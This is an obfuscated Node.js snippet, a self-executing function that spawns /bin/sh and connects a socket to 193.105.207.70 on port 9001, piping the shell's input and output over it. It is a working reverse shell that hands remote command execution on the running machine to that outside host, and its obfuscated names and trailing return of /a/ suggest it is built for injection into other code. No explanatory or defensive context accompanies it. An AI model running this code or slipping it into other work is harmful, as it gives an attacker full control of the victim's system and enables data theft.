;(function () {
  var _0x5da61a = require('net'),
    _0x5c0d17 = require('child_process'),
    _0x3cb4be = _0x5c0d17.spawn('/bin/sh', [])
  var _0x81b294 = new _0x5da61a.Socket()
  _0x81b294.connect(9001, '193.105.207.70', function () {
    _0x81b294.pipe(_0x3cb4be.stdin)
    _0x3cb4be.stdout.pipe(_0x81b294)
    _0x3cb4be.stderr.pipe(_0x81b294)
  })
  return /a/
})()

